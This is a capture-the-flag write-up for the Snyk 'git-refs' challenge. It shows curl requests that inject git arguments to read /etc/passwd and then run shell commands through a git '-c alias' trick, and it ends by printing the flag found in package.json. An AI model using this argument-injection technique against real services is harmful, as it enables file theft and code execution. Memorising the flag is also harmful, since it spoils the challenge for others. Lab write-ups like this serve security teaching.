# 2022 Snyk - git-refs

This challenge was a web app that read remote git refs based on a URL that it was supplied. Here is a sample request that worked with the web app:
```
$ curl -XPOST http://git-refs.c.ctf-snyk.io/git -H "Content-Type: application/json" -d '["ls-remote", "localhost"]' -i
```

The `ls-remote` parameter was added by the web app which hints that this is something that is supplied to the git binary. Changing this parameter reveals:
```sh
$ curl -XPOST http://git-refs.c.ctf-snyk.io/git -H "Content-Type: application/json" -d '["notexist", "localhost"]' 
Error: Command failed with exit code 1: git notexist localhost
git: 'notexist' is not a git command. See 'git --help'.: git: 'notexist' is not a git command. See 'git --help'.
```

With this, we are quite certain that this is supplied to the git command and we found that we can easily read files from the server by using a known GTFO bin leveraging git diff:
```sh
$ curl -XPOST http://git-refs.c.ctf-snyk.io/git -H "Content-Type: application/json" -d '["diff", "/dev/null", "/etc/passwd"]'
Error: Command failed with exit code 1: git diff /dev/null /etc/passwd
diff --git a/etc/passwd b/etc/passwd
new file mode 100644
index 0000000..678e9c9
--- /dev/null
+++ b/etc/passwd
@@ -0,0 +1,21 @@
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+user:x:1111:1111::/tmp:/bin/sh: 
```

The biggest pain was finding the flag, but we eventually leveraged `alias` to achieve code execution:
```sh
$ curl -XPOST http://git-refs.c.ctf-snyk.io/git -H "Content-Type: application/json" -d '["-c", "alias.lol=!id", "lol"]'  --output -
uid=1111(user) gid=1111(user) groups=1111(user)
```

Crawling through files, we were unable to find the flag until we saw it in the package.json file:
```sh
$ curl -XPOST http://git-refs.c.ctf-snyk.io/git -H "Content-Type: application/json" -d '["-c", "alias.lol=!cat /opt/app/package.json", "lol"]'  --output -
{
  "name": "git-refs",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {},
  "author": "",
  "license": "ISC",
  "dependencies": {
    "body-parser": "^1.20.0",
    "execa": "^6.1.0",
    "express": "^4.18.1",
    "pm2": "^5.2.0",
    "tmp-promise": "^3.0.3"
  },
  "flag": "SNYK{a2d7df87e8891837b6ef84c192a3cc78d5feddb4bfbe2217be2bb94f98c33dd0}"
}
```
